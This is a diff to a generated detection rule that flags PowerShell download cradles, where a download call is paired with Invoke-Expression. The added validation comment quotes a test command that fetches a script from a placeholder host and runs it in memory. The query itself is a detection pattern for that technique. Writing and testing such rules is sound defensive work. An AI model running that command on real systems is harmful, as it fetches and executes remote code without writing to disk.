@@ -1,6 +1,8 @@
 // PowerShell Download Cradle
 // Detects the in-memory download-and-execute patterns used to stage a payload without writing it to disk, covering both the WebClient and Invoke-WebRequest forms alongside an execution primitive.
-// techniques: T1059.001   severity: high
+// techniques: T1059.001   severity: high   status: stable
+// validate: Atomic Red Team T1059.001
+//   powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://<host>/a.ps1')"
 // source: rules/execution/powershell-download-cradle.yml  (GENERATED, do not edit by hand)
 Event
 | where ((((NewProcessName endswith "\\powershell.exe" or NewProcessName endswith "\\pwsh.exe")) and ((CommandLine has_any (dynamic(["DownloadString", "DownloadFile", "Invoke-WebRequest", "Net.WebClient", "iwr ", "curl "]))))) and ((CommandLine has_any (dynamic(["IEX", "Invoke-Expression", "iex(", "| iex"])))))
